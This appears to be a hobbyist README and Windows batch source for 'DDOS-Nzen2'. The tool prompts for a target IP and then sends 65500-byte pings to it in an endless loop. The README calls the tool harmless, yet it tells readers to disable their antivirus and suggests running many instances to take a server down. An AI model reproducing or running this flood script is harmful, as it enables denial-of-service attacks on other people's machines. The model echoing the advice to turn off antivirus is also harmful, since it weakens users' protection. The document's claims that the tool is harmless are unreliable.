# DDOS-Nzen2
A small DDos program that will (In theory) take down your old 2003 laptop.
It won't harm anyone, nor anything. 
Idk how you would take down a server with this, maybe running multiple instances of it...

Antiviruses DO flag this as a virus/threat, but in reality it's because I have no license with this.
If you do not believe me, just don't run the program!
I mean, It's not like it does anything.

If you do want to run the program, (Maybe benchmark a bunch of chinese off-brand Rasberry-Pie network adapters,
Just disable your antivirus while you run it.


























:DOCUMENTATION:
This program was written in batch, and recompiled with BtE.

The first chunk of the code is a segment of the BtE API.
Random UUids coupled with some strings.

Next chunk is the fake loading screen, which I just added to make
the whole thing look more organized.
It echos a started message, (To log.txt) 
and then echos ping localhost, (To log.txt)
then there is a textbook set variable command, (Which then is echoed to log.txt)
and then a few danger messages,
The ddos actually happens.
It repeat ping requests that will down the shields on your 2003 Arsenel Bird.








Code:

::[Bat To Exe Converter]
::
::YAwzoRdxOk+EWAnk
::fBw5plQjdG8=
::YAwzuBVtJxjWCl3EqQJgSA==
::ZR4luwNxJguZRRnk
::Yhs/ulQjdF+5
::cxAkpRVqdFKZSjk=
::cBs/ulQjdF+5
::ZR41oxFsdFKZSDk=
::eBoioBt6dFKZSDk=
::cRo6pxp7LAbNWATEpCI=
::egkzugNsPRvcWATEpCI=
::dAsiuh18IRvcCxnZtBJQ
::cRYluBh/LU+EWAjk
::YxY4rhs+aU+JeA==
::cxY6rQJ7JhzQF1fEqQJQ
::ZQ05rAF9IBncCkqN+0xwdVs0
::ZQ05rAF9IAHYFVzEqQJQ
::eg0/rx1wNQPfEVWB+kM9LVsJDGQ=
::fBEirQZwNQPfEVWB+kM9LVsJDGQ=
::cRolqwZ3JBvQF1fEqQJQ
::dhA7uBVwLU+EWDk=
::YQ03rBFzNR3SWATElA==
::dhAmsQZ3MwfNWATElA==
::ZQ0/vhVqMQ3MEVWAtB9wSA==
::Zg8zqx1/OA3MEVWAtB9wSA==
::dhA7pRFwIByZRRnk
::Zh4grVQjdCyDJGyX8VAjFB5QRRCNAE+/Fb4I5/jHwfCCrB9QcMYQS8L806CyA+8e+kzocJIb02hmvO8DH1VdZhfL
::YB416Ek+ZW8=
::
::
::978f952a14a936cc963da21a135fa983
@echo off
cls
title DDos Tool Nzen2- Loading
echo Started: >> log.txt
ping localhost >> log.txt
title DDos Tool Nzen2- Press anything to continue
pause
title Waiting input
goto PreAttack

:PreAttack
cls
echo ---Enter Attack IP---
set /p AttackIP= 
Echo Attack IP set to %AttackIP%
echo Attack IP set! >> log.txt
echo IP: >> log.txt
echo %AttackIP% >> log.txt
pause
goto Attacklaunch

:Attacklaunch
cls
echo FINAL CHECK: ARE YOU SURE
pause
title Launcher
goto Attack

:Attack
cls
pause goto DDos

:DDos 
:loop
ping %AttackIP% -l 65500 -w 1 -n 1
goto :loop
